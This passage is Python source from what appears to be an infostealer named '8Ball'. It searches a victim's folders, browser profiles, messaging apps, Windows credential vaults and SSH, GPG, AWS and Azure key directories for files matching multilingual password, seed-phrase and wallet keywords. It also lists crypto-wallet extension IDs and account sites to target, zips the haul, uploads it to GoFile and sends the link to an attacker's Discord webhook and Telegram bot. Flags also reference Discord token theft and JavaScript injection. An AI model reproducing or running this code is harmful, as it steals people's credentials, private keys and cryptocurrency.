        fullpath = os.path.join(pathF, file)
        if not os.path.isfile(fullpath):
            continue
        if i >= maxfilesperdir:
            break
        if os.stat(fullpath).st_size < 5000000 and not fullpath.lower().endswith(".lnk"):
            url = UP104D7060F113(fullpath)
            if url:
                ffound.append([fullpath, url])
                i += 1

    K1W1F113s.append(["folder", pathF + os.sep, ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                lower_name = file.lower()
                if not any(worf in lower_name for worf in keywords):
                    continue
                fullpath = os.path.join(root, file)
                if os.path.isfile(fullpath) and os.stat(fullpath).st_size < 5000000 and not fullpath.lower().endswith(".lnk"):
                    fifound.append(fullpath)
                    if len(fifound) >= 2000:
                        break
            if len(fifound) >= 2000:
                break
    except OSError:
        return
    K1W1F113s.append(["folder", path, fifound])


def K1W1():
    """
    Local Files feature:
    - searches Desktop, Downloads, Documents, Pictures, Videos, Recent
    - uploads matching files to GoFile and tracks them in K1W1F113s
    Only active when 'Local Files' (file_search) feature is enabled.
    """
    if not FEATURE_CONFIG.get("file_search", False):
        return []

    user_profile = os.path.expanduser("~")
    user_root = os.path.dirname(user_profile)

    if not user_root:
        user_root = user_profile

    K1W1F113s.clear()

    path2search = [
        # User profile top-level (Documents, Downloads, etc.)
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "Music"),
        # OneDrive equivalents
        os.path.join(user_profile, "OneDrive", "Desktop"),
        os.path.join(user_profile, "OneDrive", "Documents"),
        os.path.join(user_profile, "OneDrive", "Pictures"),
        os.path.join(user_profile, "OneDrive", "Downloads"),
        # AppData / config areas with valuable data
        os.path.join(roaming, "Microsoft", "Windows", "Recent"),
        os.path.join(roaming, "Microsoft", "Windows", "Start Menu"),
        os.path.join(local, "Google", "Chrome", "User Data"),
        os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
        os.path.join(roaming, "Opera Software"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        os.path.join(roaming, "discord"),
        os.path.join(local, "Discord"),
        os.path.join(roaming, "telegram"),
        os.path.join(local, "Telegram Desktop"),
        os.path.join(roaming, "Signal"),
        os.path.join(roaming, "Slack"),
        os.path.join(user_profile, "AppData"),
        # Common config/credential stores
        os.path.join(local, "Microsoft", "Credentials"),
        os.path.join(roaming, "Microsoft", "Credentials"),
        os.path.join(local, "Microsoft", "Vault"),
        os.path.join(roaming, "Microsoft", "Vault"),
        os.path.join(local, "Microsoft", "Internet Explorer"),
        os.path.join(roaming, "Microsoft", "Internet Explorer"),
        # Gaming launchers
        os.path.join(user_profile, "Documents", "Rockstar Games"),
        os.path.join(user_profile, "Documents", "My Games"),
        # SSH / GPG keys
        os.path.join(user_profile, ".ssh"),
        os.path.join(user_profile, ".gnupg"),
        os.path.join(user_profile, ".aws"),
        os.path.join(user_profile, ".azure"),
    ]
    key_wordsFiles = [
        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret",
        "bot", "atomic", "account", "acount", "paypal", "banque", "metamask", "wallet",
        "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token",
        "backup", "seed", "mnemonic", "memoric", "private", "key", "passphrase",
        "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé",
        "prive", "telegram", "identifiant", "personnel", "trading", "bitcoin",
        "sauvegarde", "funds", "récupé", "recup", "note", "txt", "doc", "json",
        "config", "cred", "secret", "auth", "api", "key", "cert",
        "пароль", "секрет", "аккаунт", "банк", "логин", "кошелек", "мнемоника",
        "密碼", "帳戶", "秘密", "登錄", "錢包", "私鑰", "助記詞",
        "биткоин", "фраза", "ключ", "заметка", "информация",
        "以太坊", "交易", "硬件钱包", "软件钱包", "资产", "提现", "存款",
        "криптовалюта", "обмен", "вложение", "инвестиция", "стейкинг", "дефи",
        "加密货币", "交换", "投资", "赌场", "个人", "交易", "费用"
    ]

    wikith = []
    for patt in path2search:
        if not os.path.exists(patt) or not os.path.isdir(patt):
            continue
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

RX_DB6("[8Ball] Initializing GLINFO...")
GLINFO = G108411NF0()
RX_DB6(f"[8Ball] GLINFO = {GLINFO}")

DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
k3YW0rd = [
    '[coinbase](https://coinbase.com)',
    '[sellix](https://sellix.io)', 
    '[gmail](https://gmail.com)', 
    '[steam](https://steam.com)', 
    '[discord](https://discord.com)', 
    '[riotgames](https://riotgames.com)', 
    '[youtube](https://youtube.com)', 
    '[instagram](https://instagram.com)', 
    '[tiktok](https://tiktok.com)', 
    '[twitter](https://twitter.com)', 
    '[facebook](https://facebook.com)', 
    '[epicgames](https://epicgames.com)', 
    '[spotify](https://spotify.com)', 
    '[yahoo](https://yahoo.com)', 
    '[roblox](https://roblox.com)', 
    '[twitch](https://twitch.com)', 
    '[minecraft](https://minecraft.net)', 
    '[paypal](https://paypal.com)', 
    '[origin](https://origin.com)', 
    '[amazon](https://amazon.com)', 
    '[ebay](https://ebay.com)', 
    '[aliexpress](https://aliexpress.com)', 
    '[playstation](https://playstation.com)', 
    '[hbo](https://hbo.com)', 
    '[xbox](https://xbox.com)', 
    '[binance](https://binance.com)', 
    '[hotmail](https://hotmail.com)', 
    '[outlook](https://outlook.com)', 
    '[crunchyroll](https://crunchyroll.com)', 
    '[telegram](https://telegram.com)', 
    '[pornhub](https://pornhub.com)', 
    '[disney](https://disney.com)', 
    '[expressvpn](https://expressvpn.com)', 
    '[uber](https://uber.com)', 
    '[netflix](https://netflix.com)', 
    '[github](https://github.com)', 
    '[stake](https://stake.com)',
    '[apple](https://apple.com)', 
    '[microsoft](https://microsoft.com)', 
    '[google](https://google.com)', 
    '[dropbox](https://dropbox.com)', 
    '[linkedin](https://linkedin.com)', 
    '[reddit](https://reddit.com)', 
    '[adobe](https://adobe.com)', 
    '[pinterest](https://pinterest.com)', 
    '[snapchat](https://snapchat.com)', 
    '[zoom](https://zoom.com)', 
    '[skype](https://skype.com)', 
    '[salesforce](https://salesforce.com)', 
    '[oracle](https://oracle.com)', 
    '[sap](https://sap.com)', 
    '[vimeo](https://vimeo.com)', 
    '[square](https://squareup.com)', 
    '[intuit](https://intuit.com)', 
    '[shopify](https://shopify.com)', 
    '[nvidia](https://nvidia.com)', 
    '[atlassian](https://atlassian.com)'
]

# Local Files feature
def filestealr():
    """
    Orchestrates Local Files feature:
    - waits for K1W1 threads
    - finds all matching local files
    - creates a ZIP archive with all files
    - uploads the ZIP to GoFile
    - sends a Discord message with the ZIP download link
    """
    if not FEATURE_CONFIG.get("file_search", False):
        return

    RX_DB6("[8Ball] Local Files: feature enabled, starting K1W1 search...")
    wikith = K1W1()
    if not wikith:
        RX_DB6("[8Ball] Local Files: K1W1 returned no threads, directories may not exist.")
        return

    RX_DB6(f"[8Ball] Local Files: {len(wikith)} search threads started, waiting for completion...")
    for thread in wikith:
        thread.join()
    time.sleep(0.5)

    # Collect all found files
    all_files = []
    for arg in K1W1F113s:
        for ffil in arg[2]:
            all_files.append(ffil)

    if not all_files:
        print("[8Ball] Local Files: no matched files found.")
        # Send a minimal embed so the user knows the feature ran
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{
                "title": "8Ball | Local Files Search",
                "description": "Local Files feature ran but found no matching files in searched directories.",
                "footer": {"text": "8Ball", "icon_url": "https://i.ibb.co/fdFfLznd.images.png"}
            }],
            "username": "8Ball",
            "avatar_url": "https://i.ibb.co/fdFfLznd.images.png",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
        }
        try:
            L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        except:
            pass
        return

    RX_DB6(f"[8Ball] Local Files: {len(all_files)} files matched.")
    print(f"[8Ball] Local Files: {len(all_files)} files matched.")

    # Create ZIP archive with all found files (no compression — avoids zlib dependency in EXE)
    zip_link = None
    zip_error = None
    try:
        temp_dir = temp or os.getenv("TEMP") or "."
        zip_path = os.path.join(temp_dir, "RX_LocalFiles.zip")

        RX_DB6(f"[8Ball] Local Files: creating ZIP at {zip_path}")
        print(f"[8Ball] Creating Local Files ZIP at: {zip_path}")
        with ZipFile(zip_path, 'w') as zipf:
            for file_path in all_files:
                if not os.path.isfile(file_path):
                    continue
                try:
                    arcname = os.path.relpath(file_path, os.path.expanduser("~"))
                except Exception:
                    arcname = os.path.basename(file_path)
                try:
                    zipf.write(file_path, arcname=arcname)
                except ValueError:
                    # ZIP does not support timestamps before 1980
                    zi = ZipInfo(arcname)
                    zi.date_time = (1980, 1, 1, 0, 0, 0)
                    zi.compress_type = ZIP_STORED
                    with open(file_path, 'rb') as f:
                        zipf.writestr(zi, f.read())

        # Upload ZIP to GoFile
        RX_DB6("[8Ball] Local Files: uploading ZIP to GoFile...")
        zip_link = UP104D7060F113(zip_path)
        RX_DB6(f"[8Ball] Local Files: GoFile returned: {zip_link}")
        print(f"[8Ball] Local Files ZIP uploaded. GoFile link: {zip_link}")

    except Exception as e:
        zip_error = f"{type(e).__name__}: {e}"
        RX_DB6(f"[8Ball] Local Files error: {zip_error}")
        print(f"[8Ball] Error while creating/uploading Local Files ZIP: {zip_error}")
        zip_link = None

    if isinstance(zip_link, list):
        err_summary = "\n".join(zip_link[-3:])
        RX_DB6(f"[8Ball] Local Files: upload failed. Errors: {'; '.join(zip_link)}")
        desc = f"📦 Found {len(all_files)} files — upload failed\n```{err_summary}```"
    elif not zip_link:
        err_msg = zip_error or "unknown error"
        RX_DB6(f"[8Ball] Local Files: ZIP creation failed: {err_msg}")
        desc = f"📦 Found {len(all_files)} files — ZIP creation failed\n```{err_msg}```"
    else:
        desc = f"📦 Found {len(all_files)} files\n\n[📥 Download ZIP]({zip_link})"

    # Send Discord embed with ZIP download link (or file list if upload failed)
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    data = {
        "content": f"@everyone @here {GLINFO}",
        "embeds": [
            {
                "title": "8Ball | Local Files Grabbed",
                "description": desc,
                "footer": {"text": "8Ball", "icon_url": "https://i.ibb.co/fdFfLznd.images.png"}
            }
        ],
        "username": "8Ball | Grabber",
        "avatar_url": "https://i.ibb.co/fdFfLznd.images.png",
        "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
    }
    try:
        RX_DB6("[8Ball] Local Files: sending Discord embed...")
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
        tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
        if tg_token and tg_chat:
            L04DUr118_TG(tg_token, tg_chat, f"{GLINFO}\nLocal Files: {len(all_files)} files grabbed")
        RX_DB6("[8Ball] Local Files: embed sent successfully.")
        print("[8Ball] Local Files embed sent to webhook.")
    except Exception as e:
        RX_DB6(f"[8Ball] Local Files: embed send failed: {e}")
        print(f"[8Ball] Error sending Local Files embed: {e}")

# Run local files first, then the main orchestrator
filestealr()
G47H3r411()

# Post-orchestrator confirmation embeds for standalone features
if FEATURE_CONFIG.get("discord_tokens", False) and not T0K3Ns:
    send_confirmation_embed("8Ball | Discord Tokens", "No Discord tokens found in browser or app storage.")

if FEATURE_CONFIG.get("nitro_badges_info", False) and not T0K3Ns:
    send_confirmation_embed("8Ball | Nitro & Badges", "No tokens available to check for Nitro or badges.")

if FEATURE_CONFIG.get("discord_injection", False):
    send_confirmation_embed("8Ball | Discord Injection", "Discord JavaScript injection feature executed.")

if FEATURE_CONFIG.get("ip_location_info", False):
    send_confirmation_embed("8Ball | IP & Location", GLINFO)
